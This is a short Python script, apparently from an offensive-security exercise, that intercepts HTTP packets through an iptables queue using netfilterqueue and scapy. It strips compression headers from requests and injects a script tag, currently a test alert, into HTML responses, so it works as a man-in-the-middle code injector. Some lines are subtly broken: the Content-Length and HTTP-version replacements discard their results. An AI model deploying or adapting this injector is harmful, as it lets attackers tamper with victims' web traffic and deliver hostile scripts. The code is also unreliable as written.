#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):  # basically to modify the packet and set it with a new load
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+]HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+]HTTP Response")
            print(scapy_packet.show())
            script = "<script>alert('test');</script>"
            load = load.replace("</body>", script + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                print(content_length)
                new_content_length = int(content_length) + len(script)
                load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


try:
    while True:
        # This makes an object which uses the netfilter library to access the queue made by the "iptables" cmd
        queue = netfilterqueue.NetfilterQueue()
        # This binds the queue that the iptables make with the "queue" variable so that the program can apply another
        # function on it
        queue.bind(0, process_packet)
        # This runs the queue command
        queue.run()
except KeyboardInterrupt:
    print("\n[-] Ending process")



